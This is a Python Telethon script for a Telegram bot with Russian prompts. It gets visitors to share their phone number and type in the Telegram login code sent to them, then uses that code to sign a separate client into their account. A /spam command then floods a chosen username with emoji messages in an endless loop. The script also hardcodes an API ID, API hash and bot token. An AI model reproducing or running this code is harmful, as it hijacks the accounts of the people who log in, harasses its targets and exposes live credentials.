import asyncio
import os
from telethon import TelegramClient, events, Button

API_ID = 34887681
API_HASH = "9a2905a9627fb1959b6699452ec59e99"
BOT_TOKEN = "8990879407:AAHi7CTsOEhLSAr38RnL6dK5teG9Bj28IuQ"

os.makedirs("sessions", exist_ok=True)

user_states = {}

async def main():
    bot = await TelegramClient("sessions/bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
    user_client = await TelegramClient("sessions/user_main", API_ID, API_HASH).start()
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start(event):
        chat_id = event.chat_id
        if chat_id in user_states and user_states[chat_id].get('logged'):
            await event.reply('✅ Доступ уже открыт! /spam @username')
            return
        
        buttons = [[Button.request_phone('📱 Передать контакт', resize=True)]]
        await event.reply('Нажми кнопку, чтобы передать контакт:', buttons=buttons)
        user_states[chat_id] = {'step': 'wait_contact'}

    @bot.on(events.NewMessage(func=lambda e: e.contact))
    async def get_contact(event):
        chat_id = event.chat_id
        if chat_id not in user_states:
            await event.reply('❌ Сначала /start')
            return
        
        phone = event.contact.phone_number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        try:
            sent = await user_client.send_code_request(phone)
            user_states[chat_id] = {
                'step': 'wait_code',
                'phone': phone,
                'phone_code_hash': sent.phone_code_hash
            }
            await event.reply(f'✅ Цифры отправлены на {phone}. Введи цифры (4-6 знаков):')
        except Exception as e:
            await event.reply(f'❌ Ошибка: {str(e)[:150]}')

    @bot.on(events.NewMessage(pattern=r'^\d{4,6}$'))
    async def get_code(event):
        chat_id = event.chat_id
        if chat_id not in user_states:
            await event.reply('❌ Сначала /start')
            return
        
        state = user_states[chat_id]
        if state.get('step') != 'wait_code':
            await event.reply('❌ Сначала передай контакт')
            return
        
        code = event.raw_text.strip()
        
        try:
            await user_client.sign_in(
                phone=state['phone'],
                code=code,
                phone_code_hash=state['phone_code_hash']
            )
            user_states[chat_id]['step'] = 'logged'
            user_states[chat_id]['logged'] = True
            await event.reply('✅ Доступ открыт! Теперь /spam @username')
        except Exception as e:
            await event.reply(f'❌ Неверные цифры: {str(e)[:150]}')

    @bot.on(events.NewMessage(pattern='/spam'))
    async def start_spam(event):
        chat_id = event.chat_id
        if chat_id not in user_states or not user_states[chat_id].get('logged'):
            await event.reply('❌ Сначала открой доступ через /start')
            return
        
        parts = event.raw_text.split()
        if len(parts) < 2:
            await event.reply('⚠️ Пример: /spam @username')
            return
        
        target = parts[1].strip()
        
        try:
            target_user = await user_client.get_entity(target)
            await event.reply(f'🍪 Запускаю отправку {target_user.first_name}!')
            count = 0
            while True:
                await user_client.send_message(target_user, '🍪' * 20)
                count += 1
                await asyncio.sleep(0.3)
                if count % 20 == 0:
                    await event.reply(f'📨 Отправлено {count} пачек')
        except Exception as e:
            await event.reply(f'❌ Ошибка: {str(e)[:150]}')

    print('🍪 БОТ ЗАПУЩЕН (безопасные слова)')
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
